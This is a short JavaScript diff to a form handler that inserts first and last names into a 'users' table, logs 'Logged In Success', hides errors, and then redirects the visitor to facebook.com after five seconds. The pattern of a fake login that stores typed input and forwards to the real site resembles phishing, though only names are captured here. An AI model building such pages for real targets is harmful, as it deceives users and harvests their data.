@@ -16,17 +16,19 @@
             .from('users')
             .insert([{ firstname, lastname }])
             .select(); // return inserted row(s)
+             console.log("Logged In Success")
 
-          if (error) throw error;
+          if (error) console.log("Log In Failed");
 
         // Implement a delay before redirection
             setTimeout(() => {
          // Redirect to your desired URL
          window.location.href = 'https://www.facebook.com';
-       }, 10000);
+       }, 5000);
         } catch (err) {
-         console.error(err);
+         console.log("Unable to Log");
         }
       });
+
 
 
